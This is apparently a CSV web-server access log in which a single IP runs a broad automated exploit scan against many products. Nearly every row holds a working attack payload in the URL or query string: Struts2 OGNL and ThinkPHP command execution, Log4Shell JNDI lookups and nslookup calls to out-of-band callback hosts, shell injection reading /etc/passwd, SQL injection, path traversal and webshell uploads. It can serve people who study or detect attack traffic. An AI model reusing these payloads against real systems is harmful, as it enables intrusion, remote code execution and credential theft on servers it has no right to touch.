"uri","query_string","request_ip","method"
"/opennms/j_spring_security_check","-","148.135.107.254","POST"
"/v1/auth/users","pageNo=1&pageSize=9","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/prweb/","-","148.135.107.254","GET"
"/upload/UploadResourcePic.ashx","ResourceID=8382","148.135.107.254","POST"
"/j_security_check","-","148.135.107.254","POST"
"/index.php","s=weibo/Share/shareBox&query=app=Common%2526model=Schedule%2526method=runSchedule%2526id%5Bstatus%5D=1%2526id%5Bmethod%5D=Schedule-%253E_validationFieldItem%2526id%5B4%5D=function%2526%5B6%5D%5B%5D=%2526id%5B0%5D=cmd%2526id%5B1%5D=assert%2526id%5Bargs%5D=cmd=system(id)","148.135.107.254","GET"
"/directdata/direct/router","-","148.135.107.254","POST"
"/seeyon/main.do","method=login","148.135.107.254","POST"
"/api/sonicos/auth","-","148.135.107.254","POST"
"/v1/submissions","-","148.135.107.254","GET"
"/api/login","-","148.135.107.254","POST"
"/index.php","s=weibo/Share/shareBox&query=app=Common%2526model=Schedule%2526method=runSchedule%2526id%5Bstatus%5D=1%2526id%5Bmethod%5D=Schedule-%253E_validationFieldItem%2526id%5B4%5D=function%2526%5B6%5D%5B%5D=%2526id%5B0%5D=cmd%2526id%5B1%5D=assert%2526id%5Bargs%5D=cmd=system(ver)","148.135.107.254","GET"
"/data/pbootcms.db","-","148.135.107.254","GET"
"/en-US/account/login","-","148.135.107.254","POST"
"/2Y3POZN3TVwpcJDqmEkPTFoOt7W.txt","-","148.135.107.254","GET"
"/php/ping.php","-","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/ddi/server/upload/lmo32u.php","-","148.135.107.254","GET"
"/login/userverify.cgi","-","148.135.107.254","POST"
"/cgi-bin/Maintain/date_config","-","148.135.107.254","POST"
"/api/ping","count=5&host=;cat%2520/etc/passwd;&port=80&source=1.1.1.1&type=icmp","148.135.107.254","GET"
"/dr/authentication/oauth2/oauth2login","error=$%257Bjndi%253Aldap%253A%252F%252F$%257B%253A-452%257D$%257B%253A-272%257D.$%257BhostName%257D.uri.cl82amo80ssu2h3kcjs04k31ynei4wbbn.oast.live%257D","148.135.107.254","GET"
"/rest/domains/list","sortCol=fullyQualifiedName&sortDir=asc","148.135.107.254","GET"
"/mainfile.php","username=test&password=testpoc&_login=1&Logon=%2527%253Becho%2520md5(TestPoc)%253B%2527","148.135.107.254","GET"
"/login.php","-","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/","g=obj_app_upfile","148.135.107.254","POST"
"/zdm/cxf/login","-","148.135.107.254","POST"
"/api/user/reg","-","148.135.107.254","POST"
"/login.php","-","148.135.107.254","POST"
"/tool/log/c.php","strip_slashes=md5&host=2Y3PNsmtFrjifvGqSjeYuxJpskN","148.135.107.254","GET"
"/login.php","-","148.135.107.254","POST"
"/api/edr/sangforinter/v2/cssp/slog_client","token=eyJtZDUiOnRydWV9","148.135.107.254","POST"
"/rep/login","-","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/index.php","a=fetch&content=%253C%253Fphp+file_put_contents%2528%25222Y3POSvLIci5WOlwlXyY7O8rzbt.php%2522%252C%2522%253C%253Fphp+echo+phpinfo%2528%2529%253B%2522%2529%253B","148.135.107.254","GET"
"/seeyon/wpsAssistServlet","flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/s9gacY.jsp&fileId=2","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/zms/admin/index.php","-","148.135.107.254","POST"
"/ddi/server/fileupload.php","uploadDir=upload&name=lmo32u.php","148.135.107.254","POST"
"/seeyon/main.do","method=changeLocale","148.135.107.254","POST"
"/actuator/env","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/general/appbuilder/web/portal/gateway/getdata","activeTab=%25E5%2527%2519,1%253D%253Eeval(base64_decode(%2522ZWNobyBtZDUoOTk5OTk5OTk5KTs=%2522)))%253B/*&id=19&module=Carouselimage","148.135.107.254","GET"
"/api/v1/database/7","-","148.135.107.254","GET"
"/api/group/list","-","148.135.107.254","GET"
"/","s=index/index/index","148.135.107.254","POST"
"/2Y3POSvLIci5WOlwlXyY7O8rzbt.php","-","148.135.107.254","GET"
"/mobile/api/api.ali.php","-","148.135.107.254","POST"
"/attachements/dniFbB.php","-","148.135.107.254","GET"
"/index.php","s=/index/index/name/$%257B@phpinfo()%257D","148.135.107.254","GET"
"/mac/gateway.php","-","148.135.107.254","POST"
"/suite-api/api/auth/token/acquire","-","148.135.107.254","POST"
"/","s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1","148.135.107.254","GET"
"/index.php","s=captcha","148.135.107.254","POST"
"/module/ueditor/php/action_upload.php","action=uploadfile","148.135.107.254","POST"
"/view/IPV6/naborTable/static_convert.php","blocks%5B0%5D=%7C%7C%2520echo%2520%25272Y3POM3qxu2lPjI2JTFj4n6bYyt%2527%2520%253E%2520/var/www/html/config_application.txt%250a","148.135.107.254","GET"
"/hybridity/api/sessions","-","148.135.107.254","POST"
"/login","-","148.135.107.254","POST"
"/config_application.txt","-","148.135.107.254","GET"
"/api/v1/database/9","-","148.135.107.254","GET"
"/defaultroot/upload/fileUpload.controller","-","148.135.107.254","POST"
"/inc/package/work.php","id=../../../../../myoa/attach/approve_center/2311/%253E%253E%253E%253E%253E%253E%253E%253E%253E%253E%253E.fb6790f4","148.135.107.254","GET"
"/websso/SAML2/SSO/vsphere.local","SAMLRequest","148.135.107.254","GET"
"/api/v1/database/9","-","148.135.107.254","GET"
"/index.php","ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1","148.135.107.254","GET"
"/ispirit/interface/gateway.php","-","148.135.107.254","POST"
"/2Y3PNY1qVZAmQ7sRnsWxk1KX3qb.php","-","148.135.107.254","GET"
"/ui/login.action","-","148.135.107.254","POST"
"/defaultroot/officeserverservlet","-","148.135.107.254","GET"
"/2Y3POd1r9EK9gTS0FUuDGYRkjtM.php","-","148.135.107.254","GET"
"/client.do","-","148.135.107.254","POST"
"/inc/jquery/uploadify/uploadify.php","-","148.135.107.254","POST"
"/weaver/bsh.servlet.BshServlet","-","148.135.107.254","POST"
"/general/weibo/javascript/LazyUploadify/uploadify.php","-","148.135.107.254","GET"
"/general/weibo/javascript/uploadify/uploadify.php","-","148.135.107.254","GET"
"/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php","-","148.135.107.254","POST"
"/api/v1/database/9","-","148.135.107.254","GET"
"/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction","action=image","148.135.107.254","POST"
"/eoffice10/server/public/iWebOffice2015/OfficeServer.php","-","148.135.107.254","POST"
"/api/v1/database/9","-","148.135.107.254","GET"
"/inc/jquery/uploadify/uploadify.php","-","148.135.107.254","GET"
"/general/weibo/javascript/LazyUploadify/uploadify.php","-","148.135.107.254","POST"
"/general/weibo/javascript/uploadify/uploadify.php","-","148.135.107.254","POST"
"/wp-admin/admin-post.php","swp_debug=load_options&swp_url=%3Cpre%3Esystem(%27cat","148.135.107.254","GET"
"/my-account/","alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=","148.135.107.254","GET"
"/UploadFileData","action=upload_file&filename=../2Y3POFFGcdh12vWsjTFqSXeEKhg.jsp","148.135.107.254","POST"
"/weaver/bsh.servlet.BshServlet","-","148.135.107.254","POST"
"/eoffice10/server/public/iWebOffice2015/Document/jormg.php","-","148.135.107.254","GET"
"/wp-content/plugins/simple-file-list/ee-upload-engine.php","-","148.135.107.254","POST"
"/wp-content/uploads/2Y3PNq904ZKFZlwSE6xbYVgt6TR.php","-","148.135.107.254","GET"
"/wp-content/plugins/simple-file-list/ee-file-engine.php","-","148.135.107.254","POST"
"/attachment/personal/_temp.php","-","148.135.107.254","GET"
"/ServiceDispatcherServlet","-","148.135.107.254","POST"
"/wp-content/uploads/simple-file-list/fibgegh.php","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/servlet/FileReceiveServlet","-","148.135.107.254","POST"
"/uapim/upload/grouptemplet","groupid=85&fileType=jsp","148.135.107.254","POST"
"/","alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=","148.135.107.254","GET"
"/ajax/getemaildata.php","DontCheckLogin=1","148.135.107.254","POST"
"/api/v1/database/9","-","148.135.107.254","GET"
"/servlet/%7Ebaseapp/nc.message.bs.NCMessageServlet","-","148.135.107.254","POST"
"/api/v1/database/10","-","148.135.107.254","GET"
"/servlet/%7Ebaseapp/nc.message.bs.NCMessageServlet","-","148.135.107.254","POST"
"/api/v1/database/10","-","148.135.107.254","GET"
"/api/v1/database/10","-","148.135.107.254","GET"
"/api/v1/database/10","-","148.135.107.254","GET"
"/api/v1/database/10","-","148.135.107.254","GET"
"/uapjs/jsinvoke/","action=invoke","148.135.107.254","POST"
"/cgi-bin/kerbynet","Section=NoAuthREQ&Action=x509List&type=*%2522;/root/kerbynet.cgi/scripts/getkey%2520../../../etc/passwd;%2522","148.135.107.254","GET"
"/admin/user.php","-","148.135.107.254","GET"
"/servlet/%7Eic/bsh.servlet.BshServlet","-","148.135.107.254","POST"
"/servlet/codesettree","flag=c&status=1&codesetid=1&parentid=-1&categories=%7E31%7E27%7E20union%7E20all%7E20select%7E20%7E27hongjing%7E27%7E2c%7E40%7E40version%7E2d%7E2d","148.135.107.254","GET"
"/axis2-admin/login","-","148.135.107.254","POST"
"/level/16/exec/show/config/CR","-","148.135.107.254","GET"
"/user.action","-","148.135.107.254","POST"
"/axis2/axis2-admin/login","-","148.135.107.254","POST"
"/","search==%2500%7B.cookie%7CLaLrcW%7Cvalue%253dCVE-2014-6287.%7D","148.135.107.254","GET"
"/webadmin/clientlogin/","srid&action=showdeny&url","148.135.107.254","GET"
"/index.action","redirect:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/images/logo/logo-eoffice.php","-","148.135.107.254","GET"
"/users/sign_in","-","148.135.107.254","GET"
"/webadmin/auth/verification.php","-","148.135.107.254","POST"
"/wlsecurity.html","-","148.135.107.254","GET"
"/horde/admin/user.php","-","148.135.107.254","GET"
"/webadm/","q=moni_detail.do&action=gragh","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/invoker/JMXInvokerServlet/","-","148.135.107.254","POST"
"/","author=1","148.135.107.254","GET"
"/login.action","redirect:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/boardDataWW.php","-","148.135.107.254","POST"
"/cgi-bin/stats","-","148.135.107.254","GET"
"/fileserver/2Y3POcokwbkbOedSmEwjrukxGrN.txt","-","148.135.107.254","PUT"
"/cgi-bin/status","-","148.135.107.254","GET"
"/services/getFile.cmd","userfile=config.xml","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/webadmin/script","command=%7C%2520nslookup%2520cl82amo80ssu2h3kcjs0gz8kjxjpw1e9u.oast.live","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/javax.faces.resource/dynamiccontent.properties.xhtml","-","148.135.107.254","POST"
"/rest/v1/AccountService/Accounts","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/_users/org.couchdb.user:poc","-","148.135.107.254","PUT"
"/fileserver/2Y3POcokwbkbOedSmEwjrukxGrN.txt","-","148.135.107.254","GET"
"/dumpmdm.cmd","-","148.135.107.254","GET"
"/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/solr/admin/cores","wt=json","148.135.107.254","GET"
"/index.action","action:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/invoker/readonly","-","148.135.107.254","POST"
"/","name=%2525%257B%2528%2523dm%253D%2540ognl.OgnlContext%2540DEFAULT_MEMBER_ACCESS%2529.%2528%2523_memberAccess%253F%2528%2523_memberAccess%253D%2523dm%2529%253A%2528%2528%2523container%253D%2523context%255B%2527com.opensymphony.xwork2.ActionContext.container%2527%255D%2529.%2528%2523ognlUtil%253D%2523container.getInstance%2528%2540com.opensymphony.xwork2.ognl.OgnlUtil%2540class%2529%2529.%2528%2523ognlUtil.getExcludedPackageNames%2528%2529.clear%2528%2529%2529.%2528%2523ognlUtil.getExcludedClasses%2528%2529.clear%2528%2529%2529.%2528%2523context.setMemberAccess%2528%2523dm%2529%2529%2529%2529.%2528%2523cmd%253D%2527cat%2520/etc/passwd%2527%2529.%2528%2523iswin%253D%2528%2540java.lang.System%2540getProperty%2528%2527os.name%2527%2529.toLowerCase%2528%2529.contains%2528%2527win%2527%2529%2529%2529.%2528%2523cmds%253D%2528%2523iswin%253F%257B%2527cmd.exe%2527%252C%2527/c%2527%252C%2523cmd%257D%253A%257B%2527/bin/bash%2527%252C%2527-c%2527%252C%2523cmd%257D%2529%2529.%2528%2523p%253Dnew%2520java.lang.ProcessBuilder%2528%2523cmds%2529%2529.%2528%2523p.redirectErrorStream%2528true%2529%2529.%2528%2523process%253D%2523p.start%2528%2529%2529.%2528%2540org.apache.commons.io.IOUtils%2540toString%2528%2523process.getInputStream%2528%2529%2529%2529%257D","148.135.107.254","POST"
"/integration/saveGangster.action","-","148.135.107.254","POST"
"/login.action","action:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/index.action","redirect%253A%2524%257B%2523context%255B%2522xwork.MethodAccessor.denyMethodExecution%2522%255D%253Dfalse%252C%2523f%253D%2523%255FmemberAccess.getClass().getDeclaredField(%2522allowStaticMethodAccess%2522)%252C%2523f.setAccessible(true)%252C%2523f.set(%2523%255FmemberAccess%252Ctrue)%252C%2523a%253D%2540java.lang.Runtime%2540getRuntime().exec(%2522sh%2520-c%2520id%2522).getInputStream()%252C%2523b%253Dnew%2520java.io.InputStreamReader(%2523a)%252C%2523c%253Dnew%2520java.io.BufferedReader(%2523b)%252C%2523d%253Dnew%2520char%255B5000%255D%252C%2523c.read(%2523d)%252C%2523genxor%253D%2523context.get(%2522com.opensymphony.xwork2.dispatcher.HttpServletResponse%2522).getWriter()%252C%2523genxor.println(%2523d)%252C%2523genxor.flush()%252C%2523genxor.close()%257D","148.135.107.254","GET"
"/CMSInstall/install.aspx","-","148.135.107.254","GET"
"/cgi-bin/login","LD_DEBUG=files","148.135.107.254","GET"
"/invoker/EJBInvokerServlet/","-","148.135.107.254","POST"
"/cgi-bin/status/status.cgi","-","148.135.107.254","GET"
"/cgi-bin/test","-","148.135.107.254","GET"
"/cobbler_api","-","148.135.107.254","POST"
"/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile","value=@GrabConfig(disableChecksums=true)%250a@GrabResolver(name=%2527test%2527,%2520root=%2527http://aaa%2527)%250a@Grab(group=%2527package%2527,%2520module=%2527vulntest%2527,%2520version=%25271%2527)%250aimport%2520Payload;","148.135.107.254","GET"
"/GponForm/diag_Form","images/","148.135.107.254","POST"
"/php/upload.php","-","148.135.107.254","POST"
"/","-","148.135.107.254","OPTIONS"
"/system/sharedir.php","-","148.135.107.254","POST"
"/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/test.cgi","-","148.135.107.254","GET"
"/index.action","action%253A%2524%257B%2523context%255B%2522xwork.MethodAccessor.denyMethodExecution%2522%255D%253Dfalse%252C%2523f%253D%2523%255FmemberAccess.getClass().getDeclaredField(%2522allowStaticMethodAccess%2522)%252C%2523f.setAccessible(true)%252C%2523f.set(%2523%255FmemberAccess%252Ctrue)%252C%2523a%253D%2540java.lang.Runtime%2540getRuntime().exec(%2522sh%2520-c%2520id%2522).getInputStream()%252C%2523b%253Dnew%2520java.io.InputStreamReader(%2523a)%252C%2523c%253Dnew%2520java.io.BufferedReader(%2523b)%252C%2523d%253Dnew%2520char%255B5000%255D%252C%2523c.read(%2523d)%252C%2523genxor%253D%2523context.get(%2522com.opensymphony.xwork2.dispatcher.HttpServletResponse%2522).getWriter()%252C%2523genxor.println(%2523d)%252C%2523genxor.flush()%252C%2523genxor.close()%257D","148.135.107.254","GET"
"/GponForm/diag_Form","images/","148.135.107.254","POST"
"/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/en/php/usb_sync.php","-","148.135.107.254","POST"
"/upload","-","148.135.107.254","POST"
"/manage/webshell/u","s=5&w=218&h=15&k=%2573%2565%2572%2576%2569%2563%2565%250a%2573%2573%2568%250a%2564%2569%2573%2561%2562%256c%2565%250a&l=62&_=5621298674064","148.135.107.254","GET"
"/cgi-bin/test-cgi","-","148.135.107.254","GET"
"/wp-admin/options-general.php","page=smartcode","148.135.107.254","POST"
"/debug.cgi","-","148.135.107.254","GET"
"/account","-","148.135.107.254","POST"
"/html/log","-","148.135.107.254","GET"
"/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm","-","148.135.107.254","POST"
"/web/google_analytics.php","-","148.135.107.254","POST"
"/ws_utc/resources/setting/options","-","148.135.107.254","POST"
"/soap.cgi","service=whatever-control;curl","148.135.107.254","POST"
"/manage/webshell/u","s=5&w=218&h=15&k=%250a&l=62&_=5621298674064","148.135.107.254","GET"
"/fuel/pages/select/","filter=%2527%252bpi(print(%2524a%253d%2527system%2527))%252b%2524a(%2527cat%2520/etc/passwd%2527)%252b%2527","148.135.107.254","GET"
"/hw-sys.htm","-","148.135.107.254","GET"
"/anchor/errors.log","-","148.135.107.254","GET"
"/user/register","element_parents=account/mail/%2523value&ajax_form=1&_wrapper_format=drupal_ajax","148.135.107.254","POST"
"/ws_utc/resources/setting/keystore","-","148.135.107.254","POST"
"/","id=nxbMek%2525%7B128*128%7D","148.135.107.254","GET"
"/index.action","redirectAction:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/login.action","redirectAction:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/checkValid","-","148.135.107.254","POST"
"/cgi-bin/kerbynet","Action=StartSessionSubmit&User=%27%250acat%2520/etc/passwd%250a%27&PW","148.135.107.254","GET"
"/install/lib/ajaxHandlers/ajaxServerSettingsChk.php","rootUname=%253b%2563%2561%2574%2520%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564%2520%2523","148.135.107.254","GET"
"/account","-","148.135.107.254","POST"
"/Uploads/2Y3PO2OgKFzJQrgNM9HxvSMa1u4.php7","-","148.135.107.254","GET"
"/crowd/plugins/servlet/exp","-","148.135.107.254","GET"
"/ui/api/v1/ui/auth/login","-","148.135.107.254","POST"
"/admin/auth/reset-password","-","148.135.107.254","POST"
"/password_change.cgi","-","148.135.107.254","POST"
"/.%250d./.%250d./.%250d./.%250d./bin/sh","-","148.135.107.254","POST"
"/pages/systemcall.php","command=cat%2520/etc/passwd","148.135.107.254","GET"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/getcfg.php","-","148.135.107.254","POST"
"/query","db=db&q=SHOW%2520DATABASES","148.135.107.254","GET"
"/Admin","-","148.135.107.254","GET"
"/index.action","redirectAction%253A%2524%257B%2523context%255B%2522xwork.MethodAccessor.denyMethodExecution%2522%255D%253Dfalse%252C%2523f%253D%2523%255FmemberAccess.getClass().getDeclaredField(%2522allowStaticMethodAccess%2522)%252C%2523f.setAccessible(true)%252C%2523f.set(%2523%255FmemberAccess%252Ctrue)%252C%2523a%253D%2540java.lang.Runtime%2540getRuntime().exec(%2522sh%2520-c%2520id%2522).getInputStream()%252C%2523b%253Dnew%2520java.io.InputStreamReader(%2523a)%252C%2523c%253Dnew%2520java.io.BufferedReader(%2523b)%252C%2523d%253Dnew%2520char%255B5000%255D%252C%2523c.read(%2523d)%252C%2523genxor%253D%2523context.get(%2522com.opensymphony.xwork2.dispatcher.HttpServletResponse%2522).getWriter()%252C%2523genxor.println(%2523d)%252C%2523genxor.flush()%252C%2523genxor.close()%257D","148.135.107.254","GET"
"/device.rsp","opt=user&cmd=list","148.135.107.254","GET"
"/crowd/admin/uploadplugin.action","-","148.135.107.254","POST"
"/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData","-","148.135.107.254","POST"
"/wls-wsat/CoordinatorPortType","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/QMHtnJRQEc.txt","-","148.135.107.254","GET"
"/wls-wsat/CoordinatorPortType","-","148.135.107.254","POST"
"/SWNetPerfMon.db.i18n.ashx","l=tjkej&v=tjkej","148.135.107.254","GET"
"/free_time.cgi","-","148.135.107.254","GET"
"/ajax/render/widget_tabbedcontainer_tab_panel","-","148.135.107.254","POST"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/adxmlrpc.php","-","148.135.107.254","POST"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/plugins/3rdPartyServers/ox3rdPartyServers/max.class.php","0=id","148.135.107.254","GET"
"/test.txt","-","148.135.107.254","GET"
"/Autodiscover/Autodiscover.xml","-","148.135.107.254","POST"
"/objects/cwnwv.txt","-","148.135.107.254","GET"
"/objects/getImage.php","base64Url=YGlkID4gY3dud3YudHh0YA===&format=png","148.135.107.254","GET"
"/service/extdirect","-","148.135.107.254","POST"
"/cgi-bin/file_transfer.cgi","-","148.135.107.254","POST"
"/objects/getImageMP4.php","base64Url=YGlkID4gY3dud3YudHh0YA===&format=jpg","148.135.107.254","GET"
"/card_scan.php","No=30&ReaderNo=%2560cat%2520/etc/passwd%2520%253E%2520QMHtnJRQEc.txt%2560","148.135.107.254","GET"
"/web.config.i18n.ashx","l=tjkej&v=tjkej","148.135.107.254","GET"
"/ucmdb-api/connect","-","148.135.107.254","GET"
"/console/css/%25252e%25252e%25252fconsole.portal","-","148.135.107.254","POST"
"/api/timelion/run","-","148.135.107.254","POST"
"/webadmin/tools/unixlogin.php","login=admin&password=g%2527%252C%2527%2527%2529%253Bimport%2520os%253Bos.system%2528%25276563686f20224d6c6b7a55453534624778494e326c48546e6845596e46785256706d4f57314a53455a5322207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%2527.decode%2528%2527hex%2527%2529%2529%2523&timeout=5","148.135.107.254","GET"
"/_async/favicon.ico","-","148.135.107.254","GET"
"/cgi-bin/login.cgi","-","148.135.107.254","POST"
"/PDC/ajaxreq.php","PARAM=127.0.0.1+-c+0%253B+cat+%252Fetc%252Fpasswd&DIAGNOSIS=PING","148.135.107.254","POST"
"/","id=%2525%257B%2528%2523instancemanager%253D%2523application%255B%2522org.apache.tomcat.InstanceManager%2522%255D%2529.%2528%2523stack%253D%2523attr%255B%2522com.opensymphony.xwork2.util.ValueStack.ValueStack%2522%255D%2529.%2528%2523bean%253D%2523instancemanager.newInstance%2528%2522org.apache.commons.collections.BeanMap%2522%2529%2529.%2528%2523bean.setBean%2528%2523stack%2529%2529.%2528%2523context%253D%2523bean.get%2528%2522context%2522%2529%2529.%2528%2523bean.setBean%2528%2523context%2529%2529.%2528%2523macc%253D%2523bean.get%2528%2522memberAccess%2522%2529%2529.%2528%2523bean.setBean%2528%2523macc%2529%2529.%2528%2523emptyset%253D%2523instancemanager.newInstance%2528%2522java.util.HashSet%2522%2529%2529.%2528%2523bean.put%2528%2522excludedClasses%2522%252C%2523emptyset%2529%2529.%2528%2523bean.put%2528%2522excludedPackageNames%2522%252C%2523emptyset%2529%2529.%2528%2523arglist%253D%2523instancemanager.newInstance%2528%2522java.util.ArrayList%2522%2529%2529.%2528%2523arglist.add%2528%2522cat+%252Fetc%252Fpasswd%2522%2529%2529.%2528%2523execute%253D%2523instancemanager.newInstance%2528%2522freemarker.template.utility.Execute%2522%2529%2529.%2528%2523execute.exec%2528%2523arglist%2529%2529%257D","148.135.107.254","GET"
"/login","-","148.135.107.254","POST"
"/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php","-","148.135.107.254","POST"
"/wls-wsat/CoordinatorPortType","-","148.135.107.254","POST"
"/objects/getSpiritsFromVideo.php","base64Url=YGlkID4gY3dud3YudHh0YA===&format=jpg","148.135.107.254","GET"
"/_async/AsyncResponseService","-","148.135.107.254","POST"
"/artifactory/ui/auth/login","_spring_security_remember_me=false","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/api/experimental/latest_runs","-","148.135.107.254","GET"
